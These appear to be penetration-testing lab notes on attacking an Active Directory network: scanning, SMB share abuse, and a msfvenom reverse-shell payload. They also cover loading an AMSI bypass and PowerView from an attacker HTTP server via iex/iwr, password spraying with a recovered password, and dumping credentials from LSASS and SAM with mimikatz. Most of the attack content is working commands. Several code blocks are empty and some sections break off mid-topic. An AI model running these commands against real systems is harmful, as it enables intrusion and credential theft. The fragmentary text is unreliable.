## 🌐 Port Scanning

We will start with port scanning to identify the live machines and open
ports on the network.

🔹 1. **Full Connect TCP Scan (sT)**

```bash
nmap -sT <target>
```

**Description:** Performs a full TCP connect scan. This is used when SYN scan isn't available (e.g., without root privileges). Establishes a full connection with the target ports.

🔹 2. **Half-Open (SYN) TCP Scan (sS)**

```bash
nmap -sS <target>
```

**Description:** Stealthier than full connect. Sends SYN packets and analyzes the response without completing the handshake. Requires root/admin privileges.

🔹 3. **UDP Scan (sU)**

```bash
nmap -sU <target>
```

**Description:** Scans for open UDP ports. Slower than TCP scans, but essential for discovering non-TCP services.

🔹 4. **Service Version Detection (sV)**

```bash
nmap -sV <target>
```

**Description:** Probes open ports to determine what service and version is running (e.g., Apache 2.4.49, SSH 7.9, etc.).

🔹 5. **Operating System Detection (O)**

```bash
nmap -O <target>
```

**Description:** Attempts to identify the target OS based on network response characteristics.

🔹 6. **Default NSE Scripts (sC)**

```bash
nmap -sC <target>
```

**Description:** Runs a collection of default Nmap Scripting Engine scripts for basic vulnerability checks, info gathering, etc.

🔹 Example: Combine Them All

```bash
nmap -sS -sV -O -sC <target>
```

**Description:** Performs a stealth scan, detects services, OS, and runs default scripts — a powerful all-in-one scan.

🔹 Honorable Mention

```bash
nmap -sS -nvv T4 <target>
```

One of them is to look for open shares on any of the reachable
machines.

🔹 **Exploit Modules**

* Target **specific vulnerabilities** to gain access.
* 📌 Command:

  ```

  ```

🔹 **Payloads**

* Code that is **executed on the target** after a successful exploit.
* 📌 Command:

  ```

  ```


### 🔍 **SMB Enumeration Using msfconsole**

1. Launch Metasploit:

   ```
   msfconsole
   ```

2. Use the SMB share scanner module:

   ```
   use auxiliary/scanner/smb/smb_enumshares
   show options
   set RHOSTS <target_host>
   run
   ```

3. Look for **open shares** — especially administrative shares like `C$`.

---

### 📁 **Accessing Shares with smbclient**

1. Connect to a shared folder:

   ```
   smbclient -N \\\\<target_IP>\\<share_name>
   # Example:
   smbclient -N \\\\192.168.2.21\\files
   ```

2. Basic smbclient commands:

   * `ls` → list files
   * `get <filename>` → download a file
   * `put <filename>` → upload a file
   * `exit` → exit smbclient

3. Test write access:

   ```bash
   echo hello > hello.txt
   smbclient -N \\\\192.168.2.21\\files
   put hello.txt
   ```

   ✅ If upload succeeds, you have **write permissions**.

---

### 🧠 **Payload Creation with msfvenom**

* If a **PowerShell script** is found on the share, you can replace or upload a malicious one.

* Create a **reverse shell payload** (assuming target is Windows x64):

  ```bash
  msfvenom -p windows/x64/meterpreter_reverse_tcp -f psh LHOST=<your_linux_ip> -o payload.ps1
  cat payload.ps1
  ```

* To prevent the session from immediately closing, add a loop at the end of `payload.ps1`:

  ```powershell
  while(1){sleep 10}
  ```

 ```bash
  tail -1 payload.ps1
 ```
---

### ✅ **Summary**

* Identified the target machines.
* Found open SMB shares.
* Confirmed write access.
* Built and prepared a payload using **msfvenom**.

## ADModule

Domain joined computer have the ability to enumarate the DC.

> Here, msfvenom is used. Find another way to get a powershell on a target machine.

::steps{level=4}
#### 1. **Upload the ADModule Zip File to the Target Machine**

* First, the user uploaded the **ADModule-master.zip** file from their **Kali/Linux box** to the **target machine**. This step involves transferring the **ADModule** zip file to the `Downloads` folder of a user (in this case, `fileadmin`).

Command:

```bash
upload /root/Desktop/tools/ADModule-master.zip C:\Users\fileadmin\Downloads
```

> The file is now located at `C:\Users\fileadmin\Downloads\ADModule-master.zip` on the target machine.

---

#### 2. **Start a PowerShell Shell on the Target Machine**

* After uploading the module, the user opened a **PowerShell shell** to start working with the module on the target system.

Command:

```bash
shell
powershell
```

> This opens a PowerShell session on the target machine (`C:\Windows\system32>`), where they navigated to the **Downloads** folder.

---

#### 3. **Navigate to the Directory Containing the Uploaded Zip**

* The user changed their working directory to the **`Downloads`** folder where the zip file was uploaded.

Command:

```powershell
cd C:\Users\fileadmin\Downloads
```

> The directory is now `C:\Users\fileadmin\Downloads`.

---

#### 4. **Extract the ADModule Zip File**

* Using **PowerShell's `Expand-Archive` cmdlet**, the user extracted the contents of **ADModule-master.zip** into the `Downloads` directory.

Command:

```powershell
Expand-Archive ADModule-master.zip
```

> This unzips the contents into a new folder `ADModule-master` under the `Downloads` directory.

---

#### 5. **Import the Necessary PowerShell Modules**

* The user proceeded to **import** the **ADModule** DLL files into PowerShell. This step loads the required components for interacting with Active Directory.

First, the **Microsoft Active Directory Management DLL** was imported:

```powershell
Import-Module C:\Users\fileadmin\Downloads\ADModule-master\ADModule-master\Microsoft.ActiveDirectory.Management.dll
```

Then, the **Active Directory PowerShell module** (which is a `.psd1` module) was imported:

```powershell
Import-Module C:\Users\fileadmin\Downloads\ADModule-master\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

> These two import commands ensure that the necessary PowerShell cmdlets to interact with Active Directory are loaded into the session.

---

#### 6. **Run AD Module Command (Example: Get-ADDomain)**

* After importing the necessary modules, the user can now execute commands related to Active Directory. For example, the `Get-ADDomain` cmdlet was run to retrieve the domain information from the target machine.

Command:

```powershell
Get-ADDomain
```

> This command would return the details of the Active Directory domain associated with the target machine.

---

#### **Summary of Key Steps**

1. **Upload the ZIP** containing ADModule to `C:\Users\fileadmin\Downloads`.
2. **Start PowerShell** on the target machine (`powershell`).
3. **Navigate to the Downloads folder** where the ZIP file was uploaded.
4. **Extract the ZIP** using `Expand-Archive`.
5. **Import the ADModule DLLs and PSD1** using `Import-Module`.
6. **Run AD cmdlets** like `Get-ADDomain` to interact with Active Directory.

## **PowerView**

::steps{level=4}
#### **1. Start a Meterpreter Session with a Shell**

The attacker first opened a shell on the target machine via an active Meterpreter session.

```bash
meterpreter > shell
```

This spawns a Windows command prompt on the victim system.

#### *2. Launch PowerShell from the Command Shell**

Inside the shell, the attacker entered PowerShell to gain access to more advanced scripting and enumeration capabilities.

```powershell
powershell
```

This starts a PowerShell session:
`PS C:\Windows\system32>`

#### **3. Use `Invoke-Expression` (`iex`) to Load Scripts Remotely**

The attacker used the `iex (iwr ...)` pattern to **download and execute scripts directly from an HTTP server** they hosted (typically using Python’s HTTP server on Kali).

```powershell
iex (iwr -UseBasicParsing http://192.168.2.1:8000/amsibypass)
iex (iwr -UseBasicParsing http://192.168.2.1:8000/PowerView.ps1)
```

> These commands do the following:
>
> * **Bypass AMSI (Antimalware Scan Interface)** so PowerView can run undetected.
> * **Load PowerView\.ps1** (a powerful AD enumeration script) into memory without saving to disk.

⚠️ *The `-UseBasicParsing` flag is used to avoid dependency on Internet Explorer components.*

#### **4. Run PowerView Commands (e.g., `Get-NetUser`)**

With PowerView loaded into memory, the attacker began using its cmdlets for Active Directory reconnaissance.

Example:

```powershell
Get-NetUser
```

This command enumerates user accounts from the domain.

#### **5. Exit PowerShell and Close the Shell**

Once enumeration was complete, the attacker exited PowerShell and then the Windows shell:

```powershell
exit
```

Then:

```cmd
exit
```

Which returned them back to the Meterpreter prompt.

#### **Summary of Key Steps**

1. **Open a shell** via Meterpreter: `meterpreter > shell`
2. **Start PowerShell** inside the shell: `powershell`
3. **Bypass AMSI and load PowerView** from remote HTTP server:

   ```powershell
   iex (iwr -UseBasicParsing http://<attacker-ip>:8000/amsibypass)
   iex (iwr -UseBasicParsing http://<attacker-ip>:8000/PowerView.ps1)
   ```
4. **Run PowerView commands** like `Get-NetUser`
5. **Exit PowerShell and the shell** to return to Meterpreter
::

## Sharpview

**SharpView\.exe** — a .NET binary version of PowerView (originally a PowerShell script) used for AD enumeration.

::steps{level=4}
#### ✅ 1. **Attacker uploads SharpView\.exe**

From the Meterpreter session:

```plaintext
meterpreter > upload /root/Desktop/tools/SharpView.exe C:\\Users\\fileadmin\\Downloads
```

* This uses Meterpreter’s `upload` command to push `SharpView.exe` from the attacker’s Kali machine to the victim.
* The destination is the `Downloads` folder of the user `fileadmin`.

---

#### 🔍 2. **Attacker launches a shell from Meterpreter**

```plaintext
meterpreter > shell
```

This spawns a native Windows shell on the victim.

---

#### 📂 3. **Navigates to the target folder**

```plaintext
C:\Windows\system32>cd C:\Users\fileadmin\Downloads\
```

---

#### 🏃 4. **Executes SharpView**

```plaintext
C:\Users\fileadmin\Downloads>SharpView.exe Get-DomainUser -domain cola
```

This command:

* Runs `SharpView.exe`
* Calls the `Get-DomainUser` function
* Specifies the domain as `cola`

🧠 **What does this do?**

* It enumerates **all domain users** within the `cola.local` Active Directory.
* Output includes usernames, group membership, account creation dates, logon count, and **descriptions** — which may reveal passwords (as it did: `description : WhatHappenedtotheL@mb?`).

---

#### 🔚 5. **Exits the session cleanly**

```plaintext
PS C:\Users\fileadmin\Downloads> exit
C:\Windows\system32> exit
meterpreter > background
```

---

#### ✅ Summary:

| Step | Action                                          |

| 1️⃣  | Upload `SharpView.exe` via Meterpreter          |

## 🎯 Credential Spraying

Attempt to authenticate against SMB services on a list of IPs using **a known username and password combo** — aka **credential spraying**.

### Metasplot Framework

* **Metasploit Framework**
* Module: `auxiliary/scanner/smb/smb_login`
* Target: SMB ports (TCP 445)

::steps{level=4}
#### 🔧 1. **Start Metasploit**

```bash
msfconsole
```

#### 📍 2. **Select the SMB login scanner module**

```bash
use auxiliary/scanner/smb/smb_login
```

#### 🧑‍💼 3. **Set SMB domain, username, and password**

These are gathered during prior enumeration (e.g., via SharpView output).

```bash
set SMBDomain cola
set SMBUser sarah
set SMBPass WhatHappenedtotheL@mb?
```

#### 🖥️ 4. **Set the list of target hosts (RHOSTS)**

In the example, the IP list had a small mistake — the IPs were listed as a comma-separated line without valid format. Here’s the correct format using **commas** or **a file**:

```bash
set RHOSTS 192.168.2.2,192.168.2.21,192.168.169.78,192.168.168.35
```

✅ Or if you have a file of IPs:

```bash
set RHOSTS file:/path/to/targets.txt
```

#### 🚀 5. **Run the spray**

```bash
exploit
```


#### ✅ 6. **Review output**

If credentials are valid, you’ll see:

```plaintext
[+] 192.168.2.2:445 - Success: 'cola\sarah:WhatHappenedtotheL@mb?'
[+] 192.168.2.21:445 - Success: 'cola\sarah:WhatHappenedtotheL@mb?'
```

⚠️ You may also see:

```plaintext
[!] No active DB -- Credential data will not be saved!
```

This means Metasploit’s database isn’t running, so creds won’t be stored persistently.

Optional: start Metasploit with `msfdb` to persist credentials.

### crackmapexec

::steps{level=4}
#### ✅ **Step 1: Install CrackMapExec (Kali Linux)**

CME isn't installed by default on newer Kali builds. Install it like this:

```bash

```

> 🔁 Or from GitHub for the latest dev version:

```bash

```

#### 📡 **Step 2: Use CME to Validate Credentials**

In `crackmapexec`, the flags `-d`, `-u`, and `-p` are used to specify the **credentials** for authentication when scanning SMB endpoints.

##### 🏷️ `-d`

**Domain**
This is the **Active Directory domain name** you're authenticating against.

> 🧠 Example:
> If the domain is `cola.local`, you’d just use:

```bash
-d cola
```

##### 🧑 `-u`

**Username**
This is the **user account** you’re using to log in.

> 🧠 Example:

```bash
-u sarah
```

##### 🔐 `-p`

**Password**
This is the **password** for the specified user.

> 🧠 Example:

```bash
-p 'WhatHappenedtotheL@mb?'
```

##### 💡 Full Example

```bash
crackmapexec smb 192.168.2.2 -d cola -u sarah -p 'WhatHappenedtotheL@mb?'
```

This tells CME:

> “Try logging into the SMB service on `192.168.2.2` using the username `sarah` from the domain `cola` with that long password.”


If you ever want to test against a **local user (non-domain)**, you can just use:

```bash
-d .    # the dot represents the local machine
```

So for local auth:

```bash
crackmapexec smb <target> -d . -u administrator -p 'localpass123'
```

```powershell
Get-PSReadlineOption | Select-Object HistorySavePath
```

#### 💻 2. **LSASS Process Memory**

* **What:** Holds active credentials and Kerberos tickets.
* **Where:** Memory of `lsass.exe`.
* **How to Dump:**

  * From **Meterpreter**:

    ```bash
    migrate <pid_of_lsass>
    hashdump
    ```
  * Or use **Mimikatz**:

    ```cmd
    sekurlsa::logonpasswords
    ```
  * Or dump with **procdump**:

    ```cmd
    procdump64.exe -ma lsass.exe lsass.dmp
    ```

    Then analyze with:

    ```cmd
    mimikatz # sekurlsa::minidump lsass.dmp
    mimikatz # sekurlsa::logonpasswords
    ```

#### 🔐 2. **LSASecrets**

* **What:** Stores saved credentials like service accounts, RDP creds.
* **Where:** Registry

  * `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`

* **How:**

  * With Mimikatz:

    ```cmd
    lsadump::secrets
    ```

  * or

    ```cmd
    reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /s
    ```


#### 📁 3. **SAM (Security Account Manager)**

* **What:** Contains local user account password hashes.
* **Where:**

  * Registry hives: `C:\Windows\System32\config\SAM`
* **How:**

  * Dump using:

    ```cmd
    reg save HKLM\SAM sam
    reg save HKLM\SYSTEM system
    ```
  * Crack offline using `samdump2` + `john` or use:

    ```cmd
    mimikatz # lsadump::sam
    ```

* **Where:**

  * `%USERPROFILE%\AppData\Local\Microsoft\Vault\`
* **How:**

  * With **Mimikatz**:


* **What:** Setup files often contain plaintext passwords.

## WDAC Enumaration

🔍 **Check PowerShell Language Mode**

Restrictive language modes can break most offensive PowerShell tools/.NET. They will not be executed, because they are not signed by microsoft:

```powershell
$ExecutionContext.SessionState.LanguageMode
```

If it's set to `ConstrainedLanguage` or `NoLanguage`, many advanced PowerShell functions will not work.


⚠️ **Even If AV is Disabled**

Disabling Defender real-time protection doesn't affect language mode:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

🧠 **Note**: Language mode is enforced by things like **AppLocker**, **WDAC**, or **Device Guard**, and not AV.


### 🧰 **Impacket: master / examples / smbexec.py**

### 📁 What is `smbexec.py`?
